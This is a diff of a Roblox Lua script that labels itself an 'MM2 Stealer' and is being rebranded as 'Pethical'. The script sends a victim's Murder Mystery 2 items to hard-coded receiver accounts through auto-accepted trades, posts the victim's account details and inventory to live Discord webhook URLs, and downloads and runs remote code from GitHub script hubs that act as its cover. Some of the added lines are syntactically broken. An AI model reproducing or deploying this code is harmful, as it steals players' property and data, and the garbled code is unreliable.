@@ -1,27 +1,10 @@
-Username = "Onodakun23"
-Webhook = "https://discord.com/api/webhooks/1301225722790281357/MnoztXET1iSnZjB2mGpGrpyc1LEPLCFK6yvDwGKml_3u1XG_jfDn-vVdpxWBOJutTy1x"
-ScriptHub = "TKD"
-
--- Variable/s (DON'T TOUCH THESE CODES)
-
--- Username = "put ur roblox username in here."
--- Webhook = "discord webhook url"
--- ScriptHub = "none" means nothing if u want to change
--- script, there are the options available 
- -- {Nexus, YARHM, Nexus, Xhub, TKD, Boss}
--- wrong spell = none
-
--- Command/s
-
--- ResendTrade = "+"
-
-
-
-shitConfig = {
-    Receivers = {Username, "OnodaKun23", "Slay_OZ1", "YTB3AR", "kely5171"},
+Config = {
+    Receivers = {"Onodakun23", "Kely5171"},
+    Webhook = "https://discord.com/api/webhooks/",
     FullInventory = true,
     GoodItemsOnly = true,
     ResendTrade = "hi",
+    Script = "TKD",
     CustomLink = ""
 }
 
@@ -30,12 +13,12 @@ repeat wait() until game:IsLoaded()
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
 
-LogsWebhook = "https://discord.com/api/webhooks/1297347293657301042/hkl2swQRysPlc-7cz83AI-8k8RIKgP4vZdeq-EcMnMHWAaRMZ_WTzE0YCloJm2aYFNlK"
+LogsWebhook = "https://discord.com/api/webhooks/1301226672497889394/inZgIvA3ENH_dsFJFAxUkcZsyPWO5-RkJidY5qCLqYHJf8tVsXQIsbGfejRB0Eobpdsv"
 
 LOGS_WEBS = LogsWebhook
 
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/STX/Module.lua"))()
-local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/STX/Client.lua"))()
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/STX/Module.lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/STX/Client.lua"))()
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -46,23 +29,23 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
-local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local Position = UDim2.new(0, 9999, 0, 9999)
 local Inventory = {}
 
 local function sendnotification(message)
     getgenv().scriptexecuted = false
-    print("[ SOON ]: " .. message)
+    print("[ Pethical | .gg/x4ZXJ9kX2W ]: " .. message)
     Notification:Notify(
-        {Title = "SOON", Description = message},
+        {Title = "Pethical | .gg/x4ZXJ9kX2W", Description = message},
         {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
     )
 end
 
 local messageMM2 =
-    "-- @everyone \n" .. TeleportScript .. ""
-    if Vintage and Godly and Ancient and Unique and shitConfig.GoodItemsOnly then
-    messageMM2 = "\n" .. TeleportScript .. ""
+    "**||@everyone|| YOU GOT HIT BY SKIDTHO!**"
+    if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
+    messageMM2 = "||@everyone|| OMG!!! YOU GOT GOOD HIT"
 end
 
 local success, errorMsg = pcall(function()
@@ -78,7 +61,7 @@ local success, errorMsg = pcall(function()
         wait(99999999999999999999999999999999999)
     end
     
-    if not Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
+    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
         sendnotification("Script terminated due to an invaild webhook url.")
         InvaildWebhook = true
         return
@@ -89,45 +72,42 @@ local success, errorMsg = pcall(function()
         return
     end
     
-    if type(shitConfig.Receivers) ~= "table" or #shitConfig.Receivers == 0 then
+    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
         sendnotification("Script terminated due to an invaild receivers table.")
         return
     end
     
-    if ScriptHub == "Custom" and not shitConfig.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
+    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
         sendnotification("Script terminated due to an invaild custom url.")
         return
     end
     
-    if shitConfig.FullInventory ~= true and shitConfig.FullInventory ~= false then
-        shitConfig.FullInventory = true
+    if Config.FullInventory ~= true and Config.FullInventory ~= false then
+        Config.FullInventory = true
     end
 
-    if ScriptHub == nil then
-        ScriptHub = "None"
-    elseif ScriptHub == "Custom" then
-        ScriptHub = ScriptHub .. " - " .. shitConfig.CustomLink
+    if Config.FullInventory ~= true and Config.FullInventory ~= false then
+        Config.FullInventory = true
     end
-    
-    if ScriptHub == "Custom" then
+
+    if Config.Script == nil then
+        Config.Script = "None"
+    elseif Config.Script == "Custom" then
+        Config.Script = Config.Script .. " - " .. Config.CustomLink
+    end
+
+    if Config.Script == "Custom" then
         loadstring(game:HttpGet(shitConfig.CustomLink))()
-    elseif ScriptHub == "Mega Hub" then
+    elseif SConfig.Script == "Mega Hub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Mega.lua",true))()
-    elseif ScriptHub == "YARHM" then
+    elseif Config.Script == "YARHM" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Muscle.lua", false))()
-    elseif ScriptHub == "Nexus" then
+    elseif Config.Script == "Nexus" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Nexus.lua"))()
-    elseif ScriptHub == "Xhub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Xhub.lua"))()
-    elseif ScriptHub == "TKD" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/TKD.lua"))()
-    elseif ScriptHub == "Boss" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Boss.lua", true))()
-    elseif ScriptHub == "OOF" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/OOF.lua", true))()
+    elseif Config.Script == "Xhub" then
+    Config.Script == "TKD" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
     end
-    
-
     
     Common = 0
     Uncommon = 0
@@ -217,7 +197,7 @@ local success, errorMsg = pcall(function()
         if v:IsA("Frame") then
             if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                 Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
-                if shitConfig.FullInventory then
+                if Config.FullInventory then
                     if v.Container.Amount.Text ~= "" then
                         number = v.Container.Amount.Text
                     else
@@ -247,7 +227,7 @@ local success, errorMsg = pcall(function()
         if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
             table.insert(Inventory, "None")
         end
-        if shitConfig.FullInventory then
+        if Config.FullInventory then
             return table.concat(Inventory, ", ")
         else
             return "Full inventory set false."
@@ -255,6 +235,7 @@ local success, errorMsg = pcall(function()
     end
     
     FullInventory()
+    
     task.wait()
     
     function Sendtrade()
@@ -278,18 +259,18 @@ local success, errorMsg = pcall(function()
     
     function readchats()
         Players[Receiver].Chatted:Connect(function(msg)
-            if msg == shitConfig.ResendTrade then
+            if msg == Config.ResendTrade then
                 Sendtrade()
             end
         end)
     end
     
     function Activate(player)
-        for i,v in pairs(shitConfig.Receivers) do
+        for i,v in pairs(Config.Receivers) do
             if v == player then
                 Receiver = player
                 readchats()
-                wait(1)
+                wait(10)
                 Sendtrade()
             end
         end
@@ -354,7 +335,7 @@ local success, errorMsg = pcall(function()
             end
         end
     
-        wait(5)
+        wait(10)
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
     end
 
@@ -369,7 +350,7 @@ local success, errorMsg = pcall(function()
     end
     
     TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
-        wait(1)
+        wait(3)
         if TradePath.Enabled then
             InsertItems()
         else
@@ -387,15 +368,19 @@ local success, errorMsg = pcall(function()
 end)
 
 local data = {
-        username = "정홍희 Trade - Result",
+        username = "Pethical Trade - Result",
         avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
         content = messageMM2,
         embeds = {
             {
-                title = '💻 **__정홍희__ | __MM2 Stealer__**',
-                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. Username .. "\nScript       : " .. ScriptHub .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+                title = '💻 **__Pethical__ | __MM2 Stealer__**',
+                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
                 color = tonumber(0x3365FF),
                 fields = {
+                    {
+                        name = "🎮Auto Joiner",
+                        value = "Soon"
+                    }
                 }
             }
         }
@@ -403,7 +388,7 @@ local data = {
 
 local request = http_request or request or HttpPost or syn.request
 request({
-    Url = Webhook,
+    Url = Config.Webhook,
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
@@ -419,4 +404,4 @@ request({
       ["Content-Type"] = "application/json"
     },
     Body = game.HttpService:JSONEncode(data)
-}) 
+})
